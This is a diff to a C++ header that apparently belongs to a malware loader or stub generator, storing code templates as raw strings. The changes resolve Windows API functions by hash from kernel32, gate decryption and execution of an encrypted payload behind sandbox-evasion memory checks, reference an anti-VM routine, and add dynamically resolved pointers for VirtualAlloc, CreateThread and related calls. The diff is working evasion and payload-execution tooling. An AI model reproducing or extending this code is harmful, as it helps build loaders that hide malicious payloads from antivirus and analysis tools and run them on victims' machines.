@@ -29,10 +29,10 @@ DWORD getHashFromString(char *string){
     return hash;
 }
 
-FARPROC getFunctionAddressByHash(const char *library, DWORD hash) {
-    HMODULE libraryBase = LoadLibraryA(library);
+FARPROC getFunctionAddressByHash(DWORD hash) {
+    HMODULE libraryBase = GetModuleHandleA("kernel32.dll");
     if (!libraryBase) {
-        cerr << "Failed to load library: " << library << " with error: " << GetLastError() << std::endl;
+        cerr << "Failed to get handle to kernel32.dll" << endl;
         return NULL;
     }
 
@@ -67,7 +67,7 @@ void resolveAddress(){
     /*DWORD_ARRAY_PLACEHOLDER*/
 
     for(int i=0;i<6;i++){
-        addr[i] = getFunctionAddressByHash(lib, fun[i]);
+        addr[i] = getFunctionAddressByHash(fun[i]);
     }
 
     // Resolve using hashing method, and compare to the result from resolveAddress()
@@ -104,15 +104,19 @@ std::string RAND_CALL = R"(
     if(blocka != NULL){
         memset(blocka, 00, a);
         free(blocka);
-    }
 
-    char *blockb = NULL;
-    blockb = (char *) malloc(b);
+        char *blockb = NULL;
+        blockb = (char *) malloc(b);
+        if(blockb != NULL){
+            memset(blockb, 00, b);
+            free(blockb);
+            
+            vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);
+            execute(payload);
+        }
 
-    if(blockb != NULL){
-        memset(blockb, 00, b);
-        free(blockb);
-        execute(payload);
+
+        
     }
 
 )";
@@ -237,5 +241,21 @@ void antiVm(){
 }
 )";
 
+string DYN_NO_HASH = R"(
+using VirtualAlloc_t = LPVOID (WINAPI *)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+using VirtualFree_t = BOOL (WINAPI *)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
+using LoadLibraryA_t = HMODULE (WINAPI *)(LPCSTR lpLibFileName);
+using CreateThread_t = HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+using WaitForSingleObject_t = DWORD (WINAPI *)(HANDLE hHandle, DWORD dwMilliseconds);
+using CloseHandle_t = BOOL (WINAPI *)(HANDLE hObject);
+
+VirtualAlloc_t VA = NULL;
+VirtualFree_t VF = NULL;
+LoadLibraryA_t LLA = NULL;
+CreateThread_t CT = NULL;
+WaitForSingleObject_t WFO = NULL;
+CloseHandle_t CH = NULL;
+
+)";
 
 #endif //STUBSTR_H
